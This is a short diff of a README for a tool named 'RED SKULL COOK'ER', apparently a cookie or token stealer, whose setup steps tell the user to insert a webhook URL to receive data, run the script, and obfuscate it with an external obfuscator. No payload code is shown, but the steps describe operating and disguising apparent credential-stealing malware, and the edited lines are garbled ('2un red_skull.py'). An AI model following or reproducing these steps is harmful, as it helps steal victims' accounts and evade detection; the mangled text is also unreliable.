@@ -9,6 +9,6 @@ RED SKULL COOK'ER
 
 ### 〢 Setting Up
 
-1. Put ur webhook at hook = ""
-2. and run main.py
-3. Obfuscation: https://github.com/billythegoat356/Hyperion
+. Put ur webhook at hook = ""
+. 2un red_skull.py
+. Obfuscation: https://github.com/billythegoat356/Hyperion
